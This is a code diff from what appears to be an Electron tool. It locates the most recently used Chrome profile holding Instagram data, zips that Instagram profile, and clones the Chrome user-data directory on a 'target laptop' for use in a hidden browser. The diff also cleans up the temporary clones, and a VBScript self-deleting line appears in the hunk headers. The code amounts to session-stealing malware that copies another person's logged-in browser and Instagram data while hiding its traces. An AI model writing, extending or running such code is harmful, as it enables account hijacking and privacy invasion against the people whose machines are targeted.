@@ -440,39 +440,41 @@ objFSO.DeleteFile WScript.ScriptFullName
                 }
             });
         });
+        });
     });
+
+    async function findInstaProfile(dir) {
+        try {
+            const items = await fs.promises.readdir(dir, { withFileTypes: true });
+            let mostRecentProfile = 'Default';
+            let latestTime = 0;
+            for (const item of items) {
+                if (item.isDirectory() && (item.name === 'Default' || item.name.startsWith('Profile '))) {
+                    // Instagram uses IndexedDB primarily
+                    const igIndexedDbPath = path.join(dir, item.name, 'IndexedDB', 'https_www.instagram.com_0.indexeddb.leveldb');
+                    if (fs.existsSync(igIndexedDbPath)) {
+                        console.log("Found Instagram in profile:", item.name);
+                        try {
+                            const stat = await fs.promises.stat(igIndexedDbPath);
+                            if (stat.mtimeMs > latestTime) {
+                                latestTime = stat.mtimeMs;
+                                mostRecentProfile = item.name;
+                            }
+                        } catch (e) {
+                            if (latestTime === 0) mostRecentProfile = item.name;
+                        }
+                    }
+                }
+            }
+            return mostRecentProfile;
+        } catch (e) {}
+        return 'Default';
+    }
 
     ipcMain.handle('zip-instagram-profile', async (event, profileName) => {
         const userDataDir = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
         const clonedDir = path.join(os.tmpdir(), 'CML_IG_Profile_Clone');
         const zipPath = path.join(os.tmpdir(), 'Instagram_Profile.zip');
-
-        async function findInstaProfile(dir) {
-            try {
-                const items = await fs.promises.readdir(dir, { withFileTypes: true });
-                let mostRecentProfile = 'Default';
-                let latestTime = 0;
-                for (const item of items) {
-                    if (item.isDirectory() && (item.name === 'Default' || item.name.startsWith('Profile '))) {
-                        // Instagram stores data in Local Storage or IndexedDB
-                        const igLocalDbPath = path.join(dir, item.name, 'Local Storage', 'leveldb');
-                        if (fs.existsSync(igLocalDbPath)) {
-                            try {
-                                const stat = await fs.promises.stat(igLocalDbPath);
-                                if (stat.mtimeMs > latestTime) {
-                                    latestTime = stat.mtimeMs;
-                                    mostRecentProfile = item.name;
-                                }
-                            } catch (e) {
-                                if (latestTime === 0) mostRecentProfile = item.name;
-                            }
-                        }
-                    }
-                }
-                return mostRecentProfile;
-            } catch (e) {}
-            return 'Default';
-        }
 
         const activeProfile = profileName || await findInstaProfile(userDataDir);
 
@@ -560,7 +562,7 @@ objFSO.DeleteFile WScript.ScriptFullName
             if (!chromeExe) throw new Error("Chrome not found on target laptop");
 
             const userDataDir = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
-            const clonedDir = path.join(os.tmpdir(), 'CML_Chrome_Clone');
+            const clonedDir = path.join(os.tmpdir(), 'CML_Chrome_Clone_' + Date.now());
 
             if (hiddenBrowser) {
                 await hiddenBrowser.close().catch(()=>{});
@@ -568,9 +570,13 @@ objFSO.DeleteFile WScript.ScriptFullName
                 hiddenClient = null;
             }
 
+            // Clean up old clones if any
             try {
-                if (fs.existsSync(clonedDir)) {
-                    await fsExtra.remove(clonedDir);
+                const tmpItems = await fs.promises.readdir(os.tmpdir());
+                for (const item of tmpItems) {
+                    if (item.startsWith('CML_Chrome_Clone_')) {
+                        fsExtra.remove(path.join(os.tmpdir(), item)).catch(()=>{});
+                    }
                 }
             } catch(e) {}
 
